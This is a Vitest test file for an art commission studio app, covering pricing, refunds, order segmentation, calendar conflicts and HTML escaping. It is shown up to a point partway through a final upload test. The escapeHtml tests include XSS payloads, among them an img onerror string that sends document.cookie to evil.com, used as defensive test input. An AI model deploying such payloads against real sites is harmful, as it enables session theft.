import { describe, it, expect } from 'vitest';
import {
  calculateOrderPricing,
  DEFAULT_STUDIO_SETTINGS,
  DEFAULT_PAYMENT_DETAILS,
  calculateNextWipStageAndProgress,
} from '@/context/StudioContext';
import { escapeHtml } from '@/lib/invoice';
import { getLocalTodayDate, getLocalFutureDate, formatMoney, formatShortDate, formatRelativeTime } from '@/lib/utils';
import { getRefundTierInfo, getActiveCancellationRequest } from '@/lib/orderCancellation';
import { deriveStudioNotifications } from '@/hooks/useStudioNotifications';
import type { OrderDraft, SubmittedOrder } from '@/types';
import { segmentAdminOrders } from '@/components/admin/useSegmentedAdminOrders';
import { mapStudioStatus } from '@/hooks/useStudioStatus';
import {
  expandDateRange,
  isDateInPast,
  calculateMultiDateSelection,
  findConflictingCommissions,
  getWeekDaysRemaining,
  getMonthDaysRemaining,
} from '@/lib/calendarUtils';
import type { AdminSubTab } from '@/components/admin/AdminNav';
import { groupOrdersByClient } from '@/components/admin/tabs/InboxTab';
import { fileToDataUrl, dataUrlToFile, resolveReferenceToUploadable } from '@/lib/storage';
import { mapCommissionRowToSubmitted, type CommissionRow } from '@/lib/supabase';
import {
  getRevisionAllowance,
  parseRevisionHistory,
  isSignoffComplete,
  getOrderSignoffStatus,
  DEFAULT_MAX_REVISIONS,
} from '@/lib/revisionWorkflow';
import {
  detectClientCurrency,
  saveCurrencyPreference,
  convertUsdToPhp,
  convertPhpToUsd,
  formatDualCurrency,
  CURRENCY_PREF_KEY,
} from '@/lib/currency';

describe('Pricing Calculation Engine (calculateOrderPricing)', () => {
  const baseDraft: OrderDraft = {
    tier: 'fullbody',
    characterCount: 1,
    addons: { nsfw: false, softFurry: false, commercial: false },
    currency: 'USD',
    paymentSplit: '50_50',
    preferredStartDate: null,
    characterName: 'Test OC',
    poseAndVibe: 'Standing proud',
    backgroundNotes: 'Studio default',
    clientContact: 'test@example.com',
    references: [],
    tosAccepted: true,
    tosAcceptedAt: new Date().toISOString(),
  };

  it('calculates correct base prices for all tiers (single character, no add-ons)', () => {
    const headshot = calculateOrderPricing({ ...baseDraft, tier: 'headshot' }, DEFAULT_STUDIO_SETTINGS);
    expect(headshot.totalUsd).toBe(15);
    expect(headshot.depositUsd).toBe(8); // ceil(15 / 2) = 8
    expect(headshot.remainingUsd).toBe(7);

    const halfbody = calculateOrderPricing({ ...baseDraft, tier: 'halfbody' }, DEFAULT_STUDIO_SETTINGS);
    expect(halfbody.totalUsd).toBe(25);
    expect(halfbody.depositUsd).toBe(13); // ceil(25 / 2) = 13
    expect(halfbody.remainingUsd).toBe(12);

    const fullbody = calculateOrderPricing({ ...baseDraft, tier: 'fullbody' }, DEFAULT_STUDIO_SETTINGS);
    expect(fullbody.totalUsd).toBe(40);
    expect(fullbody.depositUsd).toBe(20);
    expect(fullbody.remainingUsd).toBe(20);

    const chibi = calculateOrderPricing({ ...baseDraft, tier: 'chibi' }, DEFAULT_STUDIO_SETTINGS);
    expect(chibi.totalUsd).toBe(10);
    expect(chibi.depositUsd).toBe(5);

    const graphics = calculateOrderPricing({ ...baseDraft, tier: 'graphics' }, DEFAULT_STUDIO_SETTINGS);
    expect(graphics.totalUsd).toBe(5);
    expect(graphics.depositUsd).toBe(3); // ceil(5 / 2) = 3
  });

  it('scales linearly with character count and clamps between 1 and 4', () => {
    // 2 characters on fullbody ($40 * 2 = $80)
    const twoChars = calculateOrderPricing({ ...baseDraft, characterCount: 2 }, DEFAULT_STUDIO_SETTINGS);
    expect(twoChars.totalUsd).toBe(80);
    expect(twoChars.depositUsd).toBe(40);

    // 4 characters on fullbody ($40 * 4 = $160)
    const fourChars = calculateOrderPricing({ ...baseDraft, characterCount: 4 }, DEFAULT_STUDIO_SETTINGS);
    expect(fourChars.totalUsd).toBe(160);

    // Clamping: 0 or negative character count is clamped to 1
    const zeroChars = calculateOrderPricing({ ...baseDraft, characterCount: 0 }, DEFAULT_STUDIO_SETTINGS);
    expect(zeroChars.totalUsd).toBe(40);

    // Clamping: >4 characters clamped to 4
    const fiveChars = calculateOrderPricing({ ...baseDraft, characterCount: 5 }, DEFAULT_STUDIO_SETTINGS);
    expect(fiveChars.totalUsd).toBe(160);
  });

  it('applies add-on multipliers correctly and compounds with character count', () => {
    // NSFW: +50% -> multiplier = 1.5. Fullbody = $40 * 1.5 = $60
    const nsfw = calculateOrderPricing(
      { ...baseDraft, addons: { nsfw: true, softFurry: false, commercial: false } },
      DEFAULT_STUDIO_SETTINGS,
    );
    expect(nsfw.multiplier).toBe(1.5);
    expect(nsfw.totalUsd).toBe(60);

    // Soft Furry: +50% -> multiplier = 1.5. Fullbody = $40 * 1.5 = $60
    const furry = calculateOrderPricing(
      { ...baseDraft, addons: { nsfw: false, softFurry: true, commercial: false } },
      DEFAULT_STUDIO_SETTINGS,
    );
    expect(furry.multiplier).toBe(1.5);
    expect(furry.totalUsd).toBe(60);

    // Commercial: +200% -> multiplier = 3.0. Fullbody = $40 * 3.0 = $120
    const commercial = calculateOrderPricing(
      { ...baseDraft, addons: { nsfw: false, softFurry: false, commercial: true } },
      DEFAULT_STUDIO_SETTINGS,
    );
    expect(commercial.multiplier).toBe(3.0);
    expect(commercial.totalUsd).toBe(120);

    // All add-ons: 1.0 + 0.5 + 0.5 + 2.0 = 4.0x. Fullbody ($40) * 2 characters ($80) * 4.0 = $320
    const allAddons = calculateOrderPricing(
      { ...baseDraft, characterCount: 2, addons: { nsfw: true, softFurry: true, commercial: true } },
      DEFAULT_STUDIO_SETTINGS,
    );
    expect(allAddons.multiplier).toBe(4.0);
    expect(allAddons.totalUsd).toBe(320);
  });

  it('handles 100% upfront payment split correctly', () => {
    const upfront = calculateOrderPricing(
      { ...baseDraft, paymentSplit: '100_upfront' },
      DEFAULT_STUDIO_SETTINGS,
    );
    expect(upfront.totalUsd).toBe(40);
    expect(upfront.depositUsd).toBe(40);
    expect(upfront.remainingUsd).toBe(0);
  });
});

describe('Security & XSS Neutralization (escapeHtml)', () => {
  it('escapes dangerous HTML special characters', () => {
    expect(escapeHtml('&')).toBe('&amp;');
    expect(escapeHtml('<')).toBe('&lt;');
    expect(escapeHtml('>')).toBe('&gt;');
    expect(escapeHtml('"')).toBe('&quot;');
    expect(escapeHtml("'")).toBe('&#039;');
  });

  it('neutralizes script injection and image error payloads', () => {
    const xssScript = '<script>alert("pwned")</script>';
    expect(escapeHtml(xssScript)).toBe('&lt;script&gt;alert(&quot;pwned&quot;)&lt;/script&gt;');

    const xssImg = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)"/>';
    expect(escapeHtml(xssImg)).toBe(
      '&lt;img src=x onerror=&quot;fetch(&#039;https://evil.com?c=&#039;+document.cookie)&quot;/&gt;',
    );
  });

  it('handles null, undefined, numbers, and clean strings safely', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml('')).toBe('');
    expect(escapeHtml(12345)).toBe('12345');
    expect(escapeHtml('Clean Artist Name')).toBe('Clean Artist Name');
  });
});

describe('Dynamic Date Helpers & Formatting', () => {
  it('returns valid YYYY-MM-DD local today date', () => {
    const today = getLocalTodayDate();
    expect(today).toMatch(/^\d{4}-\d{2}-\d{2}$/);

    const now = new Date();
    const expectedYear = now.getFullYear();
    const expectedMonth = String(now.getMonth() + 1).padStart(2, '0');
    const expectedDay = String(now.getDate()).padStart(2, '0');
    expect(today).toBe(`${expectedYear}-${expectedMonth}-${expectedDay}`);
  });

  it('calculates future dates with arbitrary positive offsets', () => {
    const threeDays = getLocalFutureDate(3);
    expect(threeDays).toMatch(/^\d{4}-\d{2}-\d{2}$/);

    const targetDate = new Date();
    targetDate.setDate(targetDate.getDate() + 3);
    const expected = `${targetDate.getFullYear()}-${String(targetDate.getMonth() + 1).padStart(2, '0')}-${String(targetDate.getDate()).padStart(2, '0')}`;
    expect(threeDays).toBe(expected);
  });

  it('formats short dates and currencies correctly', () => {
    expect(formatShortDate('2026-11-05')).toBe('Nov 5');
    expect(formatMoney(40, 'USD')).toBe('$40');
  });
});

describe('TOS Refund Schedule Calculation (getRefundTierInfo)', () => {
  const totalUsd = 100;
  const depositUsd = 50;

  it('awards 100% full refund before sketching begins', () => {
    // Stage: pending_review (unpaid)
    const pendingUnpaid = getRefundTierInfo('pending_review', totalUsd, depositUsd, false, false);
    expect(pendingUnpaid.percentage).toBe('100% Full Refund');
    expect(pendingUnpaid.refundAmount).toBe(0);

    // Stage: awaiting_deposit (deposit paid)
    const awaitingPaid = getRefundTierInfo('awaiting_deposit', totalUsd, depositUsd, true, false);
    expect(awaitingPaid.percentage).toBe('100% Full Refund');
    expect(awaitingPaid.refundAmount).toBe(50);
  });

  it('awards 50% refund during sketch drafting stages', () => {
    // Stage: sketching with 50% deposit paid
    const sketching = getRefundTierInfo('sketching', totalUsd, depositUsd, true, false);
    expect(sketching.percentage).toBe('50% Refund');
    expect(sketching.refundAmount).toBe(25); // 50% of $50 deposit

    // Stage: sketch_approval with 100% paid upfront
    const sketchApprovalFullPaid = getRefundTierInfo('sketch_approval', totalUsd, depositUsd, true, true);
    expect(sketchApprovalFullPaid.percentage).toBe('50% Refund');
    expect(sketchApprovalFullPaid.refundAmount).toBe(50); // 50% of $100 total
  });

  it('rejects refunds (0% non-refundable) once lineart and rendering begin', () => {
    // Stage: lineart_coloring
    const lineart = getRefundTierInfo('lineart_coloring', totalUsd, depositUsd, true, true);
    expect(lineart.percentage).toBe('0% Non-Refundable');
    expect(lineart.refundAmount).toBe(0);

    // Stage: completed
    const completed = getRefundTierInfo('completed', totalUsd, depositUsd, true, true);
    expect(completed.percentage).toBe('0% Non-Refundable');
    expect(completed.refundAmount).toBe(0);
  });
});


describe('Admin Order Lifecycle Segmentation (segmentAdminOrders)', () => {
  const dummyBaseOrder: SubmittedOrder = {
    id: 'test-1',
    orderCode: 'MERU-20261102-TEST',
    createdAt: new Date().toISOString(),
    tier: 'fullbody',
    characterCount: 1,
    addons: { nsfw: false, softFurry: false, commercial: false },
    currency: 'USD',
    paymentSplit: '50_50',
    preferredStartDate: null,
    characterName: 'Test Character',
    poseAndVibe: 'Action pose',
    backgroundNotes: '',
    clientContact: 'client@example.com',
    references: [],
    tosAccepted: true,
    tosAcceptedAt: new Date().toISOString(),
    totalUsd: 100,
    depositUsd: 50,
    depositPaid: false,
    finalPaid: false,
    sketchApproved: false,
    stage: 'pending_review',
    progress: 0,
    authMethod: 'google',
    wips: [],
    messages: [],
  };

  it('correctly partitions incoming briefs from active pipeline and terminal archive', () => {
    const orders: SubmittedOrder[] = [
      { ...dummyBaseOrder, id: '1', stage: 'pending_review' },
      { ...dummyBaseOrder, id: '2', stage: 'awaiting_deposit', depositPaid: false },
      { ...dummyBaseOrder, id: '3', stage: 'sketching', depositPaid: true },
      { ...dummyBaseOrder, id: '4', stage: 'sketch_approval', depositPaid: true, finalPaid: false },
      { ...dummyBaseOrder, id: '5', stage: 'lineart_coloring', depositPaid: true, finalPaid: true },
      { ...dummyBaseOrder, id: '6', stage: 'completed', depositPaid: true, finalPaid: true },
      { ...dummyBaseOrder, id: '7', stage: 'declined' },
      { ...dummyBaseOrder, id: '8', stage: 'cancelled' },
    ];

    const result = segmentAdminOrders(orders);

    // Incoming briefs
    expect(result.incomingBriefs.map((o) => o.id)).toEqual(['1']);
    expect(result.counts.briefs).toBe(1);

    // Active pipeline
    expect(result.activePipeline.map((o) => o.id)).toEqual(['2', '3', '4', '5']);
    expect(result.counts.active).toBe(4);

    // Terminal archive (declined, cancelled, completed)
    expect(result.archivedOrders.map((o) => o.id)).toEqual(['6', '7', '8']);
    expect(result.counts.archived).toBe(3);

    // Pending payments: order 2 (unpaid deposit) and order 4 (unpaid final on 50/50 split)
    expect(result.pendingPayments.map((o) => o.id)).toEqual(['2', '4']);
    expect(result.counts.payments).toBe(2);

    // Invariant: briefs + active + archived must always partition total orders exactly
    expect(result.counts.briefs + result.counts.active + result.counts.archived).toBe(result.counts.total);
    expect(result.counts.total).toBe(8);
  });

  it('verifies partition invariant: briefs + active + archived === total across all commission stages', () => {
    const orders: SubmittedOrder[] = [
      { ...dummyBaseOrder, id: '1', stage: 'pending_review' },
      { ...dummyBaseOrder, id: '2', stage: 'awaiting_deposit' },
      { ...dummyBaseOrder, id: '3', stage: 'sketching' },
      { ...dummyBaseOrder, id: '4', stage: 'sketch_approval' },
      { ...dummyBaseOrder, id: '5', stage: 'lineart_coloring' },
      { ...dummyBaseOrder, id: '6', stage: 'completed' },
      { ...dummyBaseOrder, id: '7', stage: 'declined' },
      { ...dummyBaseOrder, id: '8', stage: 'cancelled' },
    ];

    const result = segmentAdminOrders(orders);
    expect(result.counts.briefs + result.counts.active + result.counts.archived).toBe(result.counts.total);
    expect(result.counts.total).toBe(orders.length);
  });

  it('flags completed orders with unpaid 50/50 balance in pendingPayments', () => {
    const orders: SubmittedOrder[] = [
      {
        ...dummyBaseOrder,
        id: 'comp-unpaid',
        stage: 'completed',
        paymentSplit: '50_50',
        depositPaid: true,
        finalPaid: false,
      },
      {
        ...dummyBaseOrder,
        id: 'comp-paid',
        stage: 'completed',
        paymentSplit: '50_50',
        depositPaid: true,
        finalPaid: true,
      },
    ];

    const result = segmentAdminOrders(orders);
    expect(result.counts.archived).toBe(2);
    expect(result.counts.payments).toBe(1);
    expect(result.pendingPayments.map((o) => o.id)).toEqual(['comp-unpaid']);
    expect(result.counts.briefs + result.counts.active + result.counts.archived).toBe(result.counts.total);
  });
});

describe('Phase 8A: Studio Status & Submission Gate Engine', () => {
  it('correctly maps "open" status to vibrant emerald tokens and affirmative isOpen flag', () => {
    const status = mapStudioStatus('open');
    expect(status.status).toBe('open');
    expect(status.isOpen).toBe(true);
    expect(status.isWaitlist).toBe(false);
    expect(status.isClosed).toBe(false);
    expect(status.badgeText).toBe('Open');
    expect(status.badgeBg).toBe('bg-emerald-500/15 border border-emerald-500/40');
    expect(status.badgeTextClass).toBe('text-emerald-700 font-bold');
    expect(status.dotColor).toBe('bg-emerald-500');
  });

  it('correctly maps "waitlist" status to mustard tokens and affirmative isWaitlist flag', () => {
    const status = mapStudioStatus('waitlist');
    expect(status.status).toBe('waitlist');
    expect(status.isOpen).toBe(false);
    expect(status.isWaitlist).toBe(true);
    expect(status.isClosed).toBe(false);
    expect(status.badgeText).toBe('Waitlist');
    expect(status.badgeBg).toBe('bg-mustard-soft');
    expect(status.badgeTextClass).toBe('text-mustard');
    expect(status.dotColor).toBe('bg-mustard');
  });

  it('correctly maps "closed" status to coral tokens and affirmative isClosed flag', () => {
    const status = mapStudioStatus('closed');
    expect(status.status).toBe('closed');
    expect(status.isOpen).toBe(false);
    expect(status.isWaitlist).toBe(false);
    expect(status.isClosed).toBe(true);
    expect(status.badgeText).toBe('Closed');
    expect(status.badgeBg).toBe('bg-coral-soft');
    expect(status.badgeTextClass).toBe('text-coral');
    expect(status.dotColor).toBe('bg-coral');
  });

  it('safely defaults undefined or invalid status to closed with coral tokens', () => {
    // @ts-expect-error test fallback handling
    const fallback = mapStudioStatus('unknown_status');
    expect(fallback.status).toBe('closed');
    expect(fallback.isClosed).toBe(true);
    expect(fallback.isOpen).toBe(false);
    expect(fallback.badgeText).toBe('Closed');
  });
});

describe('Phase 8B: Calendar & Multi-Date Blocking Engine (calendarUtils)', () => {
  it('correctly expands single-day and multi-day date ranges', () => {
    // Single day
    expect(expandDateRange('2026-11-10', '2026-11-10')).toEqual(['2026-11-10']);

    // Standard forward range
    const forward = expandDateRange('2026-11-10', '2026-11-14');
    expect(forward).toEqual([
      '2026-11-10',
      '2026-11-11',
      '2026-11-12',
      '2026-11-13',
      '2026-11-14',
    ]);

    // Inverted range (endDate < startDate)
    const inverted = expandDateRange('2026-11-14', '2026-11-10');
    expect(inverted).toEqual([
      '2026-11-10',
      '2026-11-11',
      '2026-11-12',
      '2026-11-13',
      '2026-11-14',
    ]);

    // Month rollover (November to December)
    const rollover = expandDateRange('2026-11-29', '2026-12-02');
    expect(rollover).toEqual(['2026-11-29', '2026-11-30', '2026-12-01', '2026-12-02']);

    // Empty or invalid input
    expect(expandDateRange('', '2026-11-10')).toEqual([]);
    expect(expandDateRange('invalid', 'date')).toEqual([]);
  });

  it('evaluates past dates accurately without timezone drift', () => {
    const today = '2026-11-05';
    expect(isDateInPast('2026-11-01', today)).toBe(true);
    expect(isDateInPast('2026-11-04', today)).toBe(true);
    expect(isDateInPast('2026-11-05', today)).toBe(false); // Today is not in the past
    expect(isDateInPast('2026-11-06', today)).toBe(false);
    expect(isDateInPast('2026-12-01', today)).toBe(false);
  });

  it('manages multi-date selection with single-click toggles and shift-click ranges', () => {
    const today = '2026-11-05';
    let selected = new Set<string>();

    // 1. Single click to select
    const step1 = calculateMultiDateSelection(selected, '2026-11-10', null, false, today);
    expect(step1.nextSelected.has('2026-11-10')).toBe(true);
    expect(step1.newAnchor).toBe('2026-11-10');
    selected = step1.nextSelected;

    // 2. Single click another date
    const step2 = calculateMultiDateSelection(selected, '2026-11-12', step1.newAnchor, false, today);
    expect(step2.nextSelected.has('2026-11-10')).toBe(true);
    expect(step2.nextSelected.has('2026-11-12')).toBe(true);
    expect(step2.newAnchor).toBe('2026-11-12');
    selected = step2.nextSelected;

    // 3. Shift-click to select range from anchor (12) to 15
    const step3 = calculateMultiDateSelection(selected, '2026-11-15', step2.newAnchor, true, today);
    expect(step3.nextSelected.has('2026-11-10')).toBe(true);
    expect(step3.nextSelected.has('2026-11-12')).toBe(true);
    expect(step3.nextSelected.has('2026-11-13')).toBe(true);
    expect(step3.nextSelected.has('2026-11-14')).toBe(true);
    expect(step3.nextSelected.has('2026-11-15')).toBe(true);
    expect(step3.newAnchor).toBe('2026-11-15');
    selected = step3.nextSelected;

    // 4. Click to toggle OFF an existing selected date
    const step4 = calculateMultiDateSelection(selected, '2026-11-10', step3.newAnchor, false, today);
    expect(step4.nextSelected.has('2026-11-10')).toBe(false);

    // 5. Attempting to select a past date is rejected
    const step5 = calculateMultiDateSelection(selected, '2026-11-01', step3.newAnchor, false, today);
    expect(step5.nextSelected.has('2026-11-01')).toBe(false);
  });

  it('detects conflicting commissions scheduled on selected dates and ignores terminal orders', () => {
    const dummyBaseOrder: SubmittedOrder = {
      id: 'test-conflict',
      orderCode: 'MERU-20261102-CONF',
      createdAt: new Date().toISOString(),
      tier: 'fullbody',
      characterCount: 1,
      addons: { nsfw: false, softFurry: false, commercial: false },
      currency: 'USD',
      paymentSplit: '50_50',
      preferredStartDate: '2026-11-15',
      startDate: '2026-11-15',
      characterName: 'Aria',
      poseAndVibe: 'Action',
      backgroundNotes: '',
      clientContact: 'aria@example.com',
      references: [],
      tosAccepted: true,
      tosAcceptedAt: new Date().toISOString(),
      totalUsd: 100,
      depositUsd: 50,
      depositPaid: true,
      finalPaid: false,
      sketchApproved: false,
      stage: 'sketching',
      progress: 30,
      authMethod: 'google',
      wips: [],
      messages: [],
    };

    const orders: SubmittedOrder[] = [
      dummyBaseOrder,
      // Same date, but order is completed (terminal) -> must NOT trigger conflict
      {
        ...dummyBaseOrder,
        id: 'comp-1',
        orderCode: 'MERU-COMP',
        stage: 'completed',
        startDate: '2026-11-15',
      },
      // Same date, but order is declined (terminal) -> must NOT trigger conflict
      {
        ...dummyBaseOrder,
        id: 'decl-1',
        orderCode: 'MERU-DECL',
        stage: 'declined',
        preferredStartDate: '2026-11-15',
      },
      // Another active order on different date
      {
        ...dummyBaseOrder,
        id: 'active-2',
        orderCode: 'MERU-ACTIVE-2',
        stage: 'awaiting_deposit',
        startDate: '2026-11-20',
        preferredStartDate: '2026-11-20',
      },
    ];

    // Check with date that conflicts
    const conflicts = findConflictingCommissions(['2026-11-14', '2026-11-15'], orders);
    expect(conflicts.length).toBe(1);
    expect(conflicts[0].orderCode).toBe('MERU-20261102-CONF');
    expect(conflicts[0].date).toBe('2026-11-15');

    // Check with multiple conflicting dates
    const multiConflicts = findConflictingCommissions(['2026-11-15', '2026-11-20'], orders);
    expect(multiConflicts.length).toBe(2);
    expect(multiConflicts.map((c) => c.orderCode)).toContain('MERU-20261102-CONF');
    expect(multiConflicts.map((c) => c.orderCode)).toContain('MERU-ACTIVE-2');

    // Check with date with no conflicts
    const noConflicts = findConflictingCommissions(['2026-11-25', '2026-11-26'], orders);
    expect(noConflicts).toEqual([]);
  });

  it('generates non-empty arrays for remaining week and month days', () => {
    const week = getWeekDaysRemaining('2026-11-05');
    expect(week.length).toBeGreaterThan(0);
    expect(week[0]).toBe('2026-11-05');

    const month = getMonthDaysRemaining('2026-11-05');
    expect(month.length).toBeGreaterThan(0);
    expect(month[0]).toBe('2026-11-05');
    expect(month[month.length - 1]).toBe('2026-11-30');
  });
});

describe('Phase 8B: Admin Navigation Subtabs & Inbox Integration', () => {
  it('confirms 6 sub-navigation tabs in AdminNav taxonomy', () => {
    const validTabs: AdminSubTab[] = ['inbox', 'pipeline', 'briefs', 'payments', 'settings', 'archive'];
    expect(validTabs.length).toBe(6);
    expect(validTabs).toContain('inbox');
    expect(validTabs).toContain('pipeline');
    expect(validTabs).toContain('briefs');
    expect(validTabs).toContain('payments');
    expect(validTabs).toContain('settings');
    expect(validTabs).toContain('archive');
  });

  it('formats dates and ISO timestamps cleanly without raw string leak', () => {
    // Plain date
    expect(formatShortDate('2026-11-05')).toBe('Nov 5');

    // Today ISO timestamp should format as time (hh:mm A)
    const nowIso = new Date().toISOString();
    const formattedNow = formatShortDate(nowIso);
    expect(formattedNow).toMatch(/\d{1,2}:\d{2}\s?(AM|PM)/i);

    // Past ISO timestamp should format as month and day (e.g. May 12)
    const pastIso = '2025-05-12T10:30:00.000Z';
    expect(formatShortDate(pastIso)).toBe('May 12');

    // Full ISO timestamp with microseconds from real Supabase DB
    const rawScreenshotTimestamp = '2024-03-15T12:28:32.581139+00:00';
    expect(formatShortDate(rawScreenshotTimestamp)).toBe('Mar 15');
  });

  it('organizes commissions by client into consolidated client groups', () => {
    const mockOrders: SubmittedOrder[] = [
      {
        id: 'ord-1',
        orderCode: 'MRU-65866B',
        clientContact: 'back ups',
        characterName: 'Kitsune OC',
        tier: 'fullbody',
        stage: 'cancelled',
        currency: 'USD',
        totalUsd: 40,
        depositUsd: 20,
        remainingUsd: 20,
        depositPaid: true,
        finalPaid: false,
        paymentSplit: '50_50',
        createdAt: '2026-11-01T12:05:00Z',
        messages: [{ id: 'm1', createdAt: '2026-11-01T12:05:00Z', body: 'Health concern', senderRole: 'artist' }],
        references: [],
        wips: [],
        payments: [],
      },
      {
        id: 'ord-2',
        orderCode: 'MRU-4ACD98',
        clientContact: 'back ups',
        characterName: 'Banner Design',
        tier: 'graphics',
        stage: 'declined',
        currency: 'USD',
        totalUsd: 5,
        depositUsd: 3,
        remainingUsd: 2,
        depositPaid: false,
        finalPaid: false,
        paymentSplit: '50_50',
        createdAt: '2026-11-01T08:50:00Z',
        messages: [],
        references: [],
        wips: [],
        payments: [],
      },
      {
        id: 'ord-3',
        orderCode: 'MRU-560CED',
        clientContact: 'back ups',
        characterName: 'Chibi Cat',
        tier: 'headshot',
        stage: 'sketching',
        currency: 'USD',
        totalUsd: 15,
        depositUsd: 8,
        remainingUsd: 7,
        depositPaid: true,
        finalPaid: false,
        paymentSplit: '50_50',
        createdAt: '2026-11-01T08:43:00Z',
        messages: [{ id: 'm2', createdAt: '2026-11-01T08:43:00Z', body: 'Hi', senderRole: 'artist' }],
        references: [],
        wips: [],
        payments: [],
      },
      {
        id: 'ord-4',
        orderCode: 'MRU-D6733A',
        clientContact: 'M-Kun Arts',
        characterName: 'Dragon Warrior',
        tier: 'fullbody',
        stage: 'awaiting_deposit',
        currency: 'USD',
        totalUsd: 40,
        depositUsd: 20,
        remainingUsd: 20,
        depositPaid: false,
        finalPaid: false,
        paymentSplit: '50_50',
        createdAt: '2026-11-01T12:28:00Z',
        messages: [{ id: 'm3', createdAt: '2026-11-01T12:28:00Z', body: 'yellowww', senderRole: 'client' }],
        references: [],
        wips: [],
        payments: [],
      },
    ];

    const unreadCounts = { 'ord-3': 1, 'ord-4': 2 };
    const clientGroups = groupOrdersByClient(mockOrders, unreadCounts);

    // 4 orders belonging to 2 distinct clients
    expect(clientGroups.length).toBe(2);

    const backUpsGroup = clientGroups.find((c) => c.clientKey === 'back ups');
    expect(backUpsGroup).toBeDefined();
    expect(backUpsGroup!.totalOrders).toBe(3);
    expect(backUpsGroup!.activeOrders.length).toBe(1);
    expect(backUpsGroup!.activeOrders[0].orderCode).toBe('MRU-560CED');
    expect(backUpsGroup!.archivedOrders.length).toBe(2);
    expect(backUpsGroup!.unreadCount).toBe(1);

    const mKunGroup = clientGroups.find((c) => c.clientKey === 'm-kun arts');
    expect(mKunGroup).toBeDefined();
    expect(mKunGroup!.totalOrders).toBe(1);
    expect(mKunGroup!.unreadCount).toBe(2);
    expect(mKunGroup!.latestMessage?.body).toBe('yellowww');

    // Confirm that inside a client group, every single order (current & past) is available
    const backUpsOrderCodes = backUpsGroup!.orders.map((o) => o.orderCode);
    expect(backUpsOrderCodes).toContain('MRU-65866B');
    expect(backUpsOrderCodes).toContain('MRU-4ACD98');
    expect(backUpsOrderCodes).toContain('MRU-560CED');
  });
});

describe('Phase 8D: Commission Request Modal Rules & Validation', () => {
  it('enforces a minimum of 1 character reference sheet before advancing', () => {
    const validateReferences = (refs: Array<{ id: string; name: string }>) => {
      if (refs.length < 1) {
        return { valid: false, error: 'Please attach at least 1 character reference sheet before proceeding.' };
      }
      return { valid: true, error: null };
    };

    expect(validateReferences([]).valid).toBe(false);
    expect(validateReferences([{ id: '1', name: 'front.png' }]).valid).toBe(true);
    expect(validateReferences([
      { id: '1', name: 'front.png' },
      { id: '2', name: 'expression.png' },
    ]).valid).toBe(true);
    expect(validateReferences([
      { id: '1', name: 'front.png' },
      { id: '2', name: 'expression.png' },
      { id: '3', name: 'palette.png' },
    ]).valid).toBe(true);
  });
});

describe('Phase 8E: Client Workspace & Multi-Order Grouping', () => {
  it('correctly partitions submitted orders into active and past categories', () => {
    const orders: Partial<SubmittedOrder>[] = [
      { id: '1', stage: 'pending_review' },
      { id: '2', stage: 'sketching' },
      { id: '3', stage: 'completed' },
      { id: '4', stage: 'declined' },
      { id: '5', stage: 'cancelled' },
      { id: '6', stage: 'lineart_coloring' },
    ];

    const active = orders.filter(
      (o) => o.stage !== 'completed' && o.stage !== 'declined' && o.stage !== 'cancelled',
    );
    const past = orders.filter(
      (o) => o.stage === 'completed' || o.stage === 'declined' || o.stage === 'cancelled',
    );

    expect(active.map((o) => o.id)).toEqual(['1', '2', '6']);
    expect(past.map((o) => o.id)).toEqual(['3', '4', '5']);
  });

  it('identifies terminal stages accurately for banner rendering', () => {
    const isTerminalStage = (stage: string) =>
      stage === 'completed' || stage === 'declined' || stage === 'cancelled';

    expect(isTerminalStage('pending_review')).toBe(false);
    expect(isTerminalStage('awaiting_deposit')).toBe(false);
    expect(isTerminalStage('sketching')).toBe(false);
    expect(isTerminalStage('sketch_approval')).toBe(false);
    expect(isTerminalStage('lineart_coloring')).toBe(false);

    expect(isTerminalStage('completed')).toBe(true);
    expect(isTerminalStage('declined')).toBe(true);
    expect(isTerminalStage('cancelled')).toBe(true);
  });
});

describe('Phase 8F: Authoritative Workflow Engine & Stage Transition Gates', () => {
  it('correctly gates stage advancement based on payments and deliverables', () => {
    const checkReadiness = (
      targetStage: string,
      order: {
        depositPaid: boolean;
        finalPaid: boolean;
        paymentSplit: '50_50' | '100_upfront';
        wips: Array<{ isFinal?: boolean }>;
      },
    ) => {
      const missing: string[] = [];
      if (targetStage === 'sketching' && !order.depositPaid) {
        missing.push('Upfront deposit receipt must be verified');
      }
      if (targetStage === 'sketch_approval' && order.wips.length === 0) {
        missing.push('At least 1 sketch WIP must be uploaded');
      }
      if (targetStage === 'lineart_coloring') {
        const isPaid = order.finalPaid || order.paymentSplit === '100_upfront';
        if (!isPaid) missing.push('Remaining balance receipt must be verified');
      }
      if (targetStage === 'completed') {
        const isPaid = order.finalPaid || order.paymentSplit === '100_upfront';
        if (!isPaid) missing.push('Order must be fully paid');
        const hasFinalWip = order.wips.some((w) => w.isFinal);
        if (!hasFinalWip) missing.push('A final deliverable artwork must be uploaded');
      }
      return { ready: missing.length === 0, missing };
    };

    // Advancing to sketching without deposit
    expect(checkReadiness('sketching', { depositPaid: false, finalPaid: false, paymentSplit: '50_50', wips: [] }).ready).toBe(false);
    // Advancing to sketching with deposit
    expect(checkReadiness('sketching', { depositPaid: true, finalPaid: false, paymentSplit: '50_50', wips: [] }).ready).toBe(true);

    // Advancing to completed without final payment or master artwork
    expect(checkReadiness('completed', { depositPaid: true, finalPaid: false, paymentSplit: '50_50', wips: [{ isFinal: true }] }).ready).toBe(false);
    expect(checkReadiness('completed', { depositPaid: true, finalPaid: true, paymentSplit: '50_50', wips: [{ isFinal: false }] }).ready).toBe(false);
    // Advancing to completed with final payment and master artwork
    expect(checkReadiness('completed', { depositPaid: true, finalPaid: true, paymentSplit: '50_50', wips: [{ isFinal: true }] }).ready).toBe(true);
    // Advancing to completed with 100% upfront payment and master artwork
    expect(checkReadiness('completed', { depositPaid: true, finalPaid: false, paymentSplit: '100_upfront', wips: [{ isFinal: true }] }).ready).toBe(true);
  });
});

describe('Reference Image Upload & Fallback Engine', () => {
  it('converts File/Blob to base64 Data URL and reconstructs File seamlessly', async () => {
    const dummyBlob = new Blob(['sample-image-bytes'], { type: 'image/png' });
    const dataUrl = await fileToDataUrl(dummyBlob);
    expect(dataUrl).toMatch(/^data:image\/png;base64,/);

    const reconstructed = dataUrlToFile(dataUrl, 'my-ref.png');
    expect(reconstructed.name).toBe('my-ref.png');
    expect(reconstructed.type).toBe('image/png');
    expect(reconstructed.size).toBeGreaterThan(0);
  });

